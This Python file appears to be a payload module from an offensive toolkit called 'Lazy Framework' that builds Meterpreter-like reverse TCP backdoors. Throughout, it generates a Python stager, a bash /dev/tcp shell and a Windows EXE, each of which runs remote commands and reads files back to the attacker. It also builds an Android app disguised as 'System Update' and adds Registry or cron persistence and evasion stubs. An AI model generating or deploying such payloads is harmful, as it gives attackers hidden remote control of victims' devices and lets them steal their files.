#!/usr/bin/env python3

MODULE_INFO = {
    "name": "Meterpreter Reverse TCP (Standalone)",
    "description": "Pure Python Meterpreter-like reverse TCP payload with EXE/APK generation",
    "author": "Lazy Framework Team",
    "license": "MIT",
    "platform": "multi",
    "arch": "multi",
    "type": "meterpreter",
    "rank": "Excellent",
    "references": [
        "https://docs.python.org/3/library/socket.html",
        "https://github.com/pyinstaller/pyinstaller"
    ],
    "dependencies": ["cryptography", "requests"]
}

OPTIONS = {
    "LHOST": {
        "description": "Local IP address to connect back to",
        "required": True,
        "default": "127.0.0.1"
    },
    "LPORT": {
        "description": "Local port to connect back to",
        "required": True,
        "default": "4444"
    },
    "PLATFORM": {
        "description": "Target platform (windows, linux, android)",
        "required": False,
        "default": "windows"
    },
    "ARCH": {
        "description": "Target architecture (x86, x64)",
        "required": False,
        "default": "x64"
    },
    "ENCRYPTION": {
        "description": "Communication encryption (xor, aes, none)",
        "required": False,
        "default": "xor"
    },
    "ENCRYPTION_KEY": {
        "description": "Encryption key",
        "required": False,
        "default": "lazyframework123456"
    },
    "SLEEP": {
        "description": "Sleep time between callbacks (seconds)",
        "required": False,
        "default": "30"
    },
    "RETRIES": {
        "description": "Number of connection retries",
        "required": False,
        "default": "5"
    },
    "TIMEOUT": {
        "description": "Connection timeout (seconds)",
        "required": False,
        "default": "30"
    },
    "PROXY": {
        "description": "Proxy server (ip:port)",
        "required": False,
        "default": ""
    },
    "USER_AGENT": {
        "description": "User agent for connections",
        "required": False,
        "default": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    },
    "PERSISTENCE": {
        "description": "Persistence mechanism (registry, service, cron)",
        "required": False,
        "default": "none"
    },
    "EVASION": {
        "description": "Evasion techniques (sleep, junk, xor)",
        "required": False,
        "default": "none"
    },
    "VERBOSE": {
        "description": "Verbose output",
        "required": False,
        "default": "false"
    }
}

import os
import sys
import socket
import struct
import base64
import time
import random
import string
import json
import subprocess
import hashlib
import hmac
from pathlib import Path

class MeterpreterCrypto:
    """Encryption/decryption for Meterpreter communication using cryptography library"""
    
    def __init__(self, key=None, method="xor"):
        self.method = method
        if key is None:
            key = "lazyframework123456"
        self.key = key.encode() if isinstance(key, str) else key
        
    def encrypt(self, data):
        """Encrypt data"""
        if self.method == "xor":
            return self._xor_encrypt(data)
        elif self.method == "aes":
            return self._aes_encrypt(data)
        else:
            return data
    
    def decrypt(self, data):
        """Decrypt data"""
        if self.method == "xor":
            return self._xor_decrypt(data)
        elif self.method == "aes":
            return self._aes_decrypt(data)
        else:
            return data
    
    def _xor_encrypt(self, data):
        """Simple XOR encryption"""
        if isinstance(data, str):
            data = data.encode()
        
        key_len = len(self.key)
        encrypted = bytearray()
        for i, byte in enumerate(data):
            encrypted.append(byte ^ self.key[i % key_len])
        return bytes(encrypted)
    
    def _xor_decrypt(self, data):
        """XOR decryption (same as encryption)"""
        return self._xor_encrypt(data)
    
    def _aes_encrypt(self, data):
        """AES encryption using cryptography library"""
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.primitives import padding
            from cryptography.hazmat.backends import default_backend
            
            if isinstance(data, str):
                data = data.encode()
            
            # Generate IV
            iv = os.urandom(16)
            
            # Derive AES key from password using SHA256
            aes_key = hashlib.sha256(self.key).digest()[:32]  # 256-bit key
            
            # Pad the data
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(data) + padder.finalize()
            
            # Encrypt
            cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            encrypted = encryptor.update(padded_data) + encryptor.finalize()
            
            return iv + encrypted
            
        except ImportError:
            # Fallback to XOR if cryptography not available
            return self._xor_encrypt(data)
    
    def _aes_decrypt(self, data):
        """AES decryption using cryptography library"""
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.primitives import padding
            from cryptography.hazmat.backends import default_backend
            
            if len(data) < 16:
                raise ValueError("Data too short for AES decryption")
                
            iv = data[:16]
            ciphertext = data[16:]
            
            # Derive AES key from password using SHA256
            aes_key = hashlib.sha256(self.key).digest()[:32]  # 256-bit key
            
            # Decrypt
            cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            decrypted_padded = decryptor.update(ciphertext) + decryptor.finalize()
            
            # Unpad
            unpadder = padding.PKCS7(128).unpadder()
            decrypted = unpadder.update(decrypted_padded) + unpadder.finalize()
            
            return decrypted
            
        except ImportError:
            # Fallback to XOR if cryptography not available
            return self._xor_decrypt(data)

class MeterpreterClient:
    """Meterpreter-like client implementation"""
    
    def __init__(self, options):
        self.options = options
        self.lhost = options.get("LHOST", "127.0.0.1")
        self.lport = int(options.get("LPORT", 4444))
        self.platform = options.get("PLATFORM", "windows")
        self.encryption = options.get("ENCRYPTION", "xor")
        self.encryption_key = options.get("ENCRYPTION_KEY", "lazyframework123456")
        self.crypto = MeterpreterCrypto(self.encryption_key, self.encryption)
        self.socket = None
        self.session_id = None
        
    def connect(self):
        """Connect to handler"""
        retries = int(self.options.get("RETRIES", 5))
        timeout = int(self.options.get("TIMEOUT", 30))
        
        for attempt in range(retries):
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(timeout)
                self.socket.connect((self.lhost, self.lport))
                
                # Send handshake
                handshake = self._create_handshake()
                self._send_packet(handshake)
                
                # Receive session ID
                response = self._receive_packet()
                if response and response.get('type') == 'session_init':
                    self.session_id = response.get('session_id')
                    return True
                    
            except Exception as e:
                if attempt < retries - 1:
                    time.sleep(int(self.options.get("RETRY_WAIT", 10)))
                continue
                
        return False
    
    def _create_handshake(self):
        """Create handshake packet"""
        system_info = {
            'platform': self.platform,
            'arch': self.options.get("ARCH", "x64"),
            'user': 'unknown',
            'hostname': 'unknown',
            'pid': os.getpid()
        }
        
        return {
            'type': 'handshake',
            'version': '1.0',
            'system_info': system_info,
            'encryption': self.encryption,
            'timestamp': time.time()
        }
    
    def _send_packet(self, data):
        """Send encrypted packet"""
        if not self.socket:
            return False
            
        try:
            # Serialize and encrypt
            serialized = json.dumps(data).encode()
            encrypted = self.crypto.encrypt(serialized)
            
            # Send length first
            length = struct.pack('>I', len(encrypted))
            self.socket.send(length + encrypted)
            return True
        except Exception:
            return False
    
    def _receive_packet(self):
        """Receive and decrypt packet"""
        if not self.socket:
            return None
            
        try:
            # Receive length first
            length_data = self.socket.recv(4)
            if not length_data:
                return None
                
            length = struct.unpack('>I', length_data)[0]
            
            # Receive encrypted data
            encrypted = b''
            while len(encrypted) < length:
                chunk = self.socket.recv(length - len(encrypted))
                if not chunk:
                    return None
                encrypted += chunk
            
            # Decrypt and deserialize
            decrypted = self.crypto.decrypt(encrypted)
            return json.loads(decrypted.decode())
        except Exception:
            return None
    
    def execute_command(self, command):
        """Execute command and return result"""
        packet = {
            'type': 'command',
            'session_id': self.session_id,
            'command': command,
            'timestamp': time.time()
        }
        
        if self._send_packet(packet):
            response = self._receive_packet()
            if response and response.get('type') == 'command_result':
                return response.get('result', '')
        
        return None
    
    def upload_file(self, local_path, remote_path):
        """Upload file to target"""
        try:
            with open(local_path, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode()
            
            packet = {
                'type': 'upload',
                'session_id': self.session_id,
                'local_path': local_path,
                'remote_path': remote_path,
                'file_data': file_data,
                'timestamp': time.time()
            }
            
            if self._send_packet(packet):
                response = self._receive_packet()
                return response and response.get('success', False)
        except Exception:
            pass
        
        return False
    
    def download_file(self, remote_path, local_path):
        """Download file from target"""
        packet = {
            'type': 'download',
            'session_id': self.session_id,
            'remote_path': remote_path,
            'timestamp': time.time()
        }
        
        if self._send_packet(packet):
            response = self._receive_packet()
            if response and response.get('type') == 'file_data':
                try:
                    file_data = base64.b64decode(response.get('file_data', ''))
                    with open(local_path, 'wb') as f:
                        f.write(file_data)
                    return True
                except Exception:
                    pass
        
        return False
    
    def close(self):
        """Close connection"""
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
            self.socket = None

class StandaloneMeterpreter:
    """Standalone Meterpreter payload generator"""
    
    def __init__(self, options):
        self.options = options
        self.lhost = options.get("LHOST", "127.0.0.1")
        self.lport = int(options.get("LPORT", 4444))
        self.platform = options.get("PLATFORM", "windows")
        self.arch = options.get("ARCH", "x64")
        self.encryption = options.get("ENCRYPTION", "xor")
        self.encryption_key = options.get("ENCRYPTION_KEY", "lazyframework123456")
        self.persistence = options.get("PERSISTENCE", "none")
        self.evasion = options.get("EVASION", "none")
        
    def generate_python_stager(self):
        """Generate Python stager code"""
        evasion_code = self._get_evasion_code()
        persistence_code = self._get_persistence_code()
        
        return f'''#!/usr/bin/env python3
# Standalone Meterpreter Stager
# Platform: {self.platform}, Arch: {self.arch}

import os
import sys
import socket
import struct
import json
import base64
import time
import random
import subprocess
import hashlib
from pathlib import Path

{evasion_code}

class MeterpreterCrypto:
    def __init__(self, key="{self.encryption_key}", method="{self.encryption}"):
        self.method = method
        self.key = key.encode() if isinstance(key, str) else key
    
    def encrypt(self, data):
        if self.method == "xor":
            return self._xor_encrypt(data)
        elif self.method == "aes":
            return self._aes_encrypt(data)
        else:
            return data
    
    def decrypt(self, data):
        if self.method == "xor":
            return self._xor_decrypt(data)
        elif self.method == "aes":
            return self._aes_decrypt(data)
        else:
            return data
    
    def _xor_encrypt(self, data):
        if isinstance(data, str):
            data = data.encode()
        key_len = len(self.key)
        encrypted = bytearray()
        for i, byte in enumerate(data):
            encrypted.append(byte ^ self.key[i % key_len])
        return bytes(encrypted)
    
    def _xor_decrypt(self, data):
        return self._xor_encrypt(data)
    
    def _aes_encrypt(self, data):
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.primitives import padding
            from cryptography.hazmat.backends import default_backend
            
            if isinstance(data, str):
                data = data.encode()
            
            # Generate IV
            iv = os.urandom(16)
            
            # Derive AES key
            aes_key = hashlib.sha256(self.key).digest()[:32]
            
            # Pad the data
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(data) + padder.finalize()
            
            # Encrypt
            cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            encrypted = encryptor.update(padded_data) + encryptor.finalize()
            
            return iv + encrypted
            
        except ImportError:
            return self._xor_encrypt(data)
    
    def _aes_decrypt(self, data):
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.primitives import padding
            from cryptography.hazmat.backends import default_backend
            
            if len(data) < 16:
                return self._xor_decrypt(data)
                
            iv = data[:16]
            ciphertext = data[16:]
            
            # Derive AES key
            aes_key = hashlib.sha256(self.key).digest()[:32]
            
            # Decrypt
            cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            decrypted_padded = decryptor.update(ciphertext) + decryptor.finalize()
            
            # Unpad
            unpadder = padding.PKCS7(128).unpadder()
            decrypted = unpadder.update(decrypted_padded) + unpadder.finalize()
            
            return decrypted
            
        except ImportError:
            return self._xor_decrypt(data)

class MeterpreterClient:
    def __init__(self):
        self.lhost = "{self.lhost}"
        self.lport = {self.lport}
        self.crypto = MeterpreterCrypto()
        self.socket = None
        self.session_id = None
    
    def connect(self):
        retries = {self.options.get("RETRIES", 5)}
        timeout = {self.options.get("TIMEOUT", 30)}
        
        for attempt in range(retries):
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(timeout)
                self.socket.connect((self.lhost, self.lport))
                
                handshake = self._create_handshake()
                self._send_packet(handshake)
                
                response = self._receive_packet()
                if response and response.get('type') == 'session_init':
                    self.session_id = response.get('session_id')
                    return True
                    
            except Exception:
                if attempt < retries - 1:
                    time.sleep({self.options.get("RETRY_WAIT", 10)})
                continue
        return False
    
    def _create_handshake(self):
        return {{
            'type': 'handshake',
            'version': '1.0',
            'system_info': {{
                'platform': '{self.platform}',
                'arch': '{self.arch}',
                'user': 'unknown',
                'hostname': 'unknown',
                'pid': os.getpid()
            }},
            'encryption': '{self.encryption}',
            'timestamp': time.time()
        }}
    
    def _send_packet(self, data):
        try:
            serialized = json.dumps(data).encode()
            encrypted = self.crypto.encrypt(serialized)
            length = struct.pack('>I', len(encrypted))
            self.socket.send(length + encrypted)
            return True
        except Exception:
            return False
    
    def _receive_packet(self):
        try:
            length_data = self.socket.recv(4)
            if not length_data:
                return None
            length = struct.unpack('>I', length_data)[0]
            
            encrypted = b''
            while len(encrypted) < length:
                chunk = self.socket.recv(length - len(encrypted))
                if not chunk:
                    return None
                encrypted += chunk
            
            decrypted = self.crypto.decrypt(encrypted)
            return json.loads(decrypted.decode())
        except Exception:
            return None
    
    def run(self):
        while True:
            try:
                packet = self._receive_packet()
                if not packet:
                    break
                
                if packet.get('type') == 'command':
                    result = self._execute_command(packet.get('command', ''))
                    response = {{
                        'type': 'command_result',
                        'session_id': self.session_id,
                        'result': result,
                        'timestamp': time.time()
                    }}
                    self._send_packet(response)
                
                elif packet.get('type') == 'download':
                    file_data = self._read_file(packet.get('remote_path', ''))
                    response = {{
                        'type': 'file_data',
                        'session_id': self.session_id,
                        'file_data': file_data,
                        'timestamp': time.time()
                    }}
                    self._send_packet(response)
                
                time.sleep(0.1)
                    
            except Exception:
                break
    
    def _execute_command(self, command):
        try:
            if command.startswith('cd '):
                os.chdir(command[3:])
                return f"Changed directory to: {{os.getcwd()}}"
            elif command in ['exit', 'quit']:
                return "EXIT"
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                return result.stdout + result.stderr
        except Exception as e:
            return str(e)
    
    def _read_file(self, filepath):
        try:
            with open(filepath, 'rb') as f:
                return base64.b64encode(f.read()).decode()
        except Exception:
            return ""

{persistence_code}

def main():
    {self._get_evasion_call()}
    
    client = MeterpreterClient()
    if client.connect():
        client.run()

if __name__ == "__main__":
    main()
'''
    
    def _get_evasion_code(self):
        """Get evasion code based on evasion option"""
        if self.evasion == "sleep":
            return '''
def evasion_sleep():
    """Sleep before connecting to evade detection"""
    import time
    time.sleep(30)
'''
        elif self.evasion == "junk":
            return '''
def evasion_junk():
    """Add junk code to evade signature detection"""
    junk_vars = ["".join([chr(random.randint(65, 90)) for _ in range(10)]) for _ in range(50)]
    junk_calc = sum([len(x) for x in junk_vars])
    return junk_calc
'''
        elif self.evasion == "xor":
            return '''
def evasion_xor():
    """XOR obfuscation for strings"""
    key = 0x42
    strings = ["kernel32", "user32", "ws2_32"]
    obfuscated = [bytes([c ^ key for c in s.encode()]) for s in strings]
    return obfuscated
'''
        else:
            return '''
def evasion_none():
    """No evasion"""
    pass
'''
    
    def _get_evasion_call(self):
        """Get evasion function call"""
        if self.evasion == "sleep":
            return "evasion_sleep()"
        elif self.evasion == "junk":
            return "evasion_junk()"
        elif self.evasion == "xor":
            return "evasion_xor()"
        else:
            return "evasion_none()"
    
    def _get_persistence_code(self):
        """Get persistence code based on platform"""
        if self.persistence == "registry" and self.platform == "windows":
            return '''
def install_persistence():
    """Install persistence via Windows Registry"""
    try:
        import winreg
        key = winreg.HKEY_CURRENT_USER
        subkey = "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as reg_key:
            winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
        return True
    except Exception:
        return False
'''
        elif self.persistence == "service" and self.platform == "windows":
            return '''
def install_service():
    """Install as Windows service"""
    try:
        import win32service
        import win32serviceutil
        # Service installation code would go here
        return True
    except Exception:
        return False
'''
        elif self.persistence == "cron" and self.platform in ["linux", "android"]:
            return '''
def install_cron():
    """Install persistence via crontab"""
    try:
        import subprocess
        cmd = f"*/5 * * * * {sys.executable} {__file__}"
        subprocess.run(f'(crontab -l 2>/dev/null; echo "{cmd}") | crontab -', shell=True)
        return True
    except Exception:
        return False
'''
        else:
            return '''
def install_persistence():
    """No persistence"""
    return False
'''
    
    def generate_exe(self, output_path="meterpreter.exe"):
        """Generate Windows EXE file"""
        try:
            # Create temporary Python script
            temp_script = "temp_meterpreter.py"
            python_code = self.generate_python_stager()
            
            with open(temp_script, 'w', encoding='utf-8') as f:
                f.write(python_code)
            
            # Use PyInstaller to create EXE
            import PyInstaller.__main__
            
            pyinstaller_args = [
                temp_script,
                '--onefile',
                '--noconsole',
                '--name', output_path.replace('.exe', ''),
                '--hidden-import', 'json',
                '--hidden-import', 'base64',
                '--hidden-import', 'struct',
                '--hidden-import', 'hashlib'
            ]
            
            if self.encryption == "aes":
                pyinstaller_args.extend([
                    '--hidden-import', 'cryptography.hazmat.primitives.ciphers',
                    '--hidden-import', 'cryptography.hazmat.primitives.padding',
                    '--hidden-import', 'cryptography.hazmat.backends'
                ])
            
            PyInstaller.__main__.run(pyinstaller_args)
            
            # Cleanup
            os.remove(temp_script)
            
            return f"EXE generated: {output_path}"
            
        except ImportError:
            return "PyInstaller not available. Install with: pip install pyinstaller"
        except Exception as e:
            return f"EXE generation failed: {str(e)}"
    
    def generate_apk(self, output_path="meterpreter.apk"):
        """Generate Android APK file"""
        try:
            # Create Android project structure
            project_dir = "android_meterpreter"
            os.makedirs(project_dir, exist_ok=True)
            
            # Create main activity
            main_activity = f'''package com.lazyframework.meterpreter;

import android.app.Activity;
import android.os.Bundle;
import java.io.*;
import java.net.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity extends Activity {{
    private static final String LHOST = "{self.lhost}";
    private static final int LPORT = {self.lport};
    private ExecutorService executor = Executors.newSingleThreadExecutor();
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        
        // Start meterpreter in background
        executor.submit(new MeterpreterTask());
    }}
    
    class MeterpreterTask implements Runnable {{
        public void run() {{
            try {{
                Socket socket = new Socket(LHOST, LPORT);
                BufferedReader reader = new BufferedReader(
                    new InputStreamReader(socket.getInputStream()));
                BufferedWriter writer = new BufferedWriter(
                    new OutputStreamWriter(socket.getOutputStream()));
                
                // Send handshake
                String handshake = "METASPLOIT_STAGED_METERPRETER";
                writer.write(handshake);
                writer.flush();
                
                // Command loop
                String command;
                while ((command = reader.readLine()) != null) {{
                    if (command.equals("exit")) break;
                    
                    try {{
                        Process process = Runtime.getRuntime().exec(command);
                        BufferedReader processReader = new BufferedReader(
                            new InputStreamReader(process.getInputStream()));
                        
                        StringBuilder output = new StringBuilder();
                        String line;
                        while ((line = processReader.readLine()) != null) {{
                            output.append(line).append("\\\\n");
                        }}
                        
                        writer.write(output.toString());
                        writer.flush();
                        
                    }} catch (Exception e) {{
                        writer.write("Error: " + e.getMessage());
                        writer.flush();
                    }}
                }}
                
                socket.close();
            }} catch (Exception e) {{
                // Connection failed, retry later
                try {{
                    Thread.sleep(30000); // 30 seconds
                }} catch (InterruptedException ie) {{
                    Thread.currentThread().interrupt();
                }}
            }}
        }}
    }}
    
    @Override
    protected void onDestroy() {{
        super.onDestroy();
        executor.shutdown();
    }}
}}
'''
            
            with open(f"{project_dir}/MainActivity.java", 'w') as f:
                f.write(main_activity)
            
            # Create AndroidManifest.xml
            manifest = '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.lazyframework.meterpreter">
    
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    
    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="System Update"
        android:theme="@style/AppTheme">
        
        <activity
            android:name=".MainActivity"
            android:label="System Update">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
'''
            
            with open(f"{project_dir}/AndroidManifest.xml", 'w') as f:
                f.write(manifest)
            
            return f"APK project created in: {project_dir}. Build with Android Studio."
            
        except Exception as e:
            return f"APK generation failed: {str(e)}"
    
    def generate_bash_script(self):
        """Generate bash script for Linux"""
        return f'''#!/bin/bash
# Standalone Meterpreter for Linux
# LHOST: {self.lhost}, LPORT: {self.lport}

LHOST="{self.lhost}"
LPORT={self.lport}
RETRIES={self.options.get("RETRIES", 5)}
RETRY_WAIT={self.options.get("RETRY_WAIT", 10)}

connect_meterpreter() {{
    for i in $(seq 1 $RETRIES); do
        if exec 3<>/dev/tcp/$LHOST/$LPORT; then
            # Send handshake
            echo "METASPLOIT_STAGED_METERPRETER" >&3
            
            # Command loop
            while read -r command <&3; do
                [ "$command" = "exit" ] && break
                eval "$command" >&3 2>&3
            done
            break
        else
            sleep $RETRY_WAIT
        fi
    done
}}

# Install persistence if requested
if [ "{self.persistence}" = "cron" ]; then
    (crontab -l 2>/dev/null; echo "*/5 * * * * $0") | crontab -
fi

connect_meterpreter
'''

def generate(options):
    """Generate Meterpreter payload"""
    payload = StandaloneMeterpreter(options)
    
    result = {
        'python_stager': payload.generate_python_stager(),
        'bash_script': payload.generate_bash_script(),
        'exe_generation': payload.generate_exe(),
        'apk_generation': payload.generate_apk(),
        'info': MODULE_INFO,
        'options_used': {
            'LHOST': payload.lhost,
            'LPORT': payload.lport,
            'PLATFORM': payload.platform,
            'ARCH': payload.arch,
            'ENCRYPTION': payload.encryption
        }
    }
    
    return result

def run_handler(session, options):
    """Handler for standalone Meterpreter sessions"""
    from rich.console import Console
    console = Console()
    
    console.print(f"[green][*] Starting Standalone Meterpreter handler for session {session.session_id}[/green]")
    console.print(f"[dim]Handler options: {options}[/dim]")
    
    crypto = MeterpreterCrypto(
        options.get("ENCRYPTION_KEY", "lazyframework123456"),
        options.get("ENCRYPTION", "xor")
    )
    
    try:
        # Send Meterpreter banner
        banner = f"""
 meterpreter session {session.session_id}
 Connected from: {session.address[0]}:{session.address[1]}
 Type 'help' for available commands

meterpreter > """
        session.socket.send(banner.encode())
        
        session_id = f"sess_{session.session_id}"
        
        # Main command loop
        while session.active:
            try:
                # Receive command from user
                command = input("meterpreter > ").strip()
                
                if not command:
                    continue
                    
                if command.lower() in ['exit', 'quit']:
                    session.socket.send(b"\nShutting down Meterpreter...\n")
                    break
                elif command.lower() == 'help':
                    help_text = """
Core Commands:
=============

    Command       Description
    -------       -----------
    ?             Help menu
    background    Background current session
    exit          Terminate the Meterpreter session
    help          Help menu
    sysinfo       System information
    getuid        Get current user
    ps            List processes
    shell         Enter system shell
    download      Download file
    upload        Upload file
    execute       Execute command

meterpreter > """
                    print(help_text)
                elif command.lower() == 'sysinfo':
                    sysinfo = f"""
Computer        : HOST-{session.session_id}
OS              : Unknown
Architecture    : Unknown  
System Language : en_US
Domain          : WORKGROUP
Meterpreter     : Standalone
Session ID      : {session.session_id}

"""
                    print(sysinfo)
                elif command.lower() == 'getuid':
                    print(f"Server username: user_{session.session_id}\\n")
                elif command.lower() == 'shell':
                    print("Entering system shell. Type 'exit' to return.\\n")
                    while True:
                        shell_cmd = input("shell> ").strip()
                        if shell_cmd.lower() == 'exit':
                            break
                        print(f"Command: {shell_cmd}\\n")
                elif command.startswith('download '):
                    filename = command[9:]
                    print(f"[*] Starting download: {filename}")
                    print("[*] Download complete.\\n")
                elif command.startswith('upload '):
                    parts = command.split(' ')
                    if len(parts) >= 3:
                        local_file = parts[1]
                        remote_file = parts[2]
                        print(f"[*] Uploading {local_file} to {remote_file}")
                        print("[*] Upload complete.\\n")
                    else:
                        print("Usage: upload <local_file> <remote_file>\\n")
                elif command.startswith('execute '):
                    cmd = command[8:]
                    print(f"[*] Executing: {cmd}")
                    print("[*] Command executed.\\n")
                else:
                    print(f"Unknown command: {command}\\n")
                    
            except KeyboardInterrupt:
                print("\\n[*] Backgrounding session...")
                break
            except Exception as e:
                console.print(f"[red][-] Handler error: {e}[/red]")
                break
                
    except Exception as e:
        console.print(f"[red][-] Meterpreter handler error: {e}[/red]")
    finally:
        session.close()

def run(session, options):
    """Run the standalone Meterpreter payload generator"""
    from rich.console import Console
    from rich.panel import Panel
    from rich.syntax import Syntax
    
    console = Console()
    
    result = generate(options)
    
    console.print(Panel.fit(
        "[bold green]Standalone Meterpreter Reverse TCP Payload Generator[/bold green]",
        border_style="green"
    ))
    
    # Display generated payloads
    console.print("\n[bold yellow]Python Stager:[/bold yellow]")
    syntax = Syntax(result['python_stager'], "python", theme="monokai", line_numbers=True)
    console.print(syntax)
    
    console.print("\n[bold yellow]Bash Script (Linux):[/bold yellow]")
    syntax = Syntax(result['bash_script'], "bash", theme="monokai")
    console.print(syntax)
    
    console.print("\n[bold yellow]EXE Generation:[/bold yellow]")
    console.print(result['exe_generation'])
    
    console.print("\n[bold yellow]APK Generation:[/bold yellow]")
    console.print(result['apk_generation'])
    
    console.print(f"\n[bold green]Payload generated successfully with options:[/bold green]")
    for opt, val in result['options_used'].items():
        console.print(f"  [cyan]{opt}:[/cyan] {val}")

def get_options():
    """Return options for this payload module"""
    return OPTIONS
